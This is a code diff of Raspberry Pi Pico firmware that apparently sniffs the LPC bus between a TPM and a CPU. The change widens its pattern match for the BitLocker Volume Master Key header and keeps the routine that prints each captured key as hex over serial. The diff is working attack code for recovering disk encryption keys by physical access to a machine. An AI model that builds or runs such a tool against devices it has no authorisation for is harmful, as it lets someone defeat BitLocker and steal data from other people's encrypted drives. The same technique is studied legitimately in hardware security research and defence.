@@ -11,22 +11,16 @@
 
 #define LED_PIN PICO_DEFAULT_LED_PIN
 
-// Our assembled program:
-#include "lpc_sniffer.pio.h"
-
-
-#include "hardware/flash.h"
-
 // set bool for our wait loop till someone connects via serial
 bool serial_data_available() {
     return tud_cdc_connected();
 }
 
 unsigned char reverse(unsigned char b) {
-   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
-   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
-   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
-   return b;
+    b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
+    b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
+    b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
+    return b;
 }
 
 static inline char reverse_nibbles(char c) {
@@ -103,10 +97,6 @@ static inline uint32_t fetch_message(PIO pio, uint sm) {
         }
     }
 }
-
-static const char vmk_header[] = {
-    0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
-};
 
 #define MAXCOUNT 512
 uint32_t buf[MAXCOUNT];
@@ -188,19 +178,43 @@ int main() {
         // Wait til the msg_buffer_ptr is full
         while((msg_buffer_ptr - popped) < 44) {
         }
-        
-        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
-            printf("[+] Bitlocker Volume Master Key found:\n");
 
-            for(int i=0; i < 2; i++) {
-                printf("[+] ");
-                for(int j=0; j < 2; j++) {
-                    for(int k=0; k < 8; k++) {
-                        printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
+        // The VMK Header is variable and can look anything like this: 2c000[0-6]000[1-9]000[0-1]000[0-5]200000
+        // Check if the first byte of the message matches the vmk header pattern
+        if(message_buffer[popped] == 0x2c) {
+            uint8_t byte3 = message_buffer[popped + 2];
+            uint8_t byte5 = message_buffer[popped + 4];
+            uint8_t byte7 = message_buffer[popped + 6];
+            uint8_t byte9 = message_buffer[popped + 8];
+            uint8_t byte10 = message_buffer[popped + 9];
+            
+            // Check if the third byte falls within the allowed range
+            if(byte3 >= 0x00 && byte3 <= 0x06) {
+                // Check if the fifth byte falls within the allowed range
+                if(byte5 >= 0x01 && byte5 <= 0x09) {
+                    // Check if the seventh byte falls within the allowed range
+                    if(byte7 >= 0x00 && byte7 <= 0x01) {
+                        // Check if the ninth byte falls within the allowed range
+                        if(byte9 >= 0x00 && byte9 <= 0x05) {
+                            // Check if the tenth byte equals 0x20
+                            if(byte10 == 0x20) {
+                                // Header matched
+                                printf("[+] Bitlocker Volume Master Key found:\n");
+
+                                for(int i=0; i < 2; i++) {
+                                    printf("[+] ");
+                                    for(int j=0; j < 2; j++) {
+                                        for(int k=0; k < 8; k++) {
+                                            printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
+                                        }
+                                        printf(" ");
+                                    }
+                                    puts("");
+                                }
+                            }
+                        }
                     }
-                    printf(" ");
                 }
-                puts("");
             }
         }
     }
